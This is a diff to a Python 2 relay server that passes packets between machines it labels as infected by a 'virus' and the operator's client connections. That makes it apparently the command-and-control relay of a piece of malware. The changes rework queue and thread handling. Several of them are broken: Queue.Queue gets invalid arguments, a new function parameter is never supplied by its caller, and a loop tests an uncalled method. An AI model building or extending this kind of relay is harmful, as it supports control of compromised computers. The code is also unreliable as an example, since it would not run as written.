@@ -3,7 +3,7 @@ import sys
 from StringIO import StringIO
 import threading, time
 from packet import Packet
-from Queue import Queue
+import Queue
 import errno
 
 class RelayServer:
@@ -63,13 +63,14 @@ class RelayServer:
 
     def onVirusConnect(self,client,address):
         print address[0] + " infected!"
-        q = Queue()
+        q = Queue.Queue(block=True,timeout=60)
         self.toVirus[address[0]] = (client,q)
         self.sendIPList()
-        threading.Thread(target=self.receiveFromVirus,args=[client,address]).start()
-        threading.Thread(target=self.dequeue,args=[q,client]).start()
+        t = threading.Thread(target=self.receiveFromVirus,args=[client,address])
+        t.start()
+        threading.Thread(target=self.dequeue,args=[q,client,t]).start()
 
-    def receiveFromVirus(self,s,address):
+    def receiveFromVirus(self,s,address,q):
         while True:
             pkt = Packet()
             try:
@@ -87,11 +88,12 @@ class RelayServer:
 
     def onClientConnect(self,client,address):
         print address[0] + " connected!"
-        q = Queue()
+        q = Queue.Queue(block=True,timeout=60)
         self.toClient[address[0]] = (client,q)
         self.sendIPList(address)
-        threading.Thread(target=self.receiveFromClient,args=[client,address]).start()
-        threading.Thread(target=self.dequeue,args=[q,client]).start()
+        t = threading.Thread(target=self.receiveFromClient,args=[client,address])
+        t.start()
+        threading.Thread(target=self.dequeue,args=[q,client,t]).start()
 
     def receiveFromClient(self,s,address):
         while True:
@@ -102,6 +104,7 @@ class RelayServer:
                 if error.errno == 10054 or error.errno == 104:
                     del self.toClient[address[0]]
                     print address[0] + " closed client!"
+                    break
                 else:
                     raise
             pkt.returnIP = address[0]
@@ -118,10 +121,13 @@ class RelayServer:
         q = self.toVirus[pkt.toIP][1]
         q.put(pkt)
 
-    def dequeue(self,q,s):
-        while True:
-            pkt = q.get()
-            pkt.send(s)
+    def dequeue(self,q,s,t):
+        while t.isAlive:
+            try:
+                pkt = q.get()
+                pkt.send(s)
+            except Queue.Empty:
+                pass
 
 def main():
     r = RelayServer()
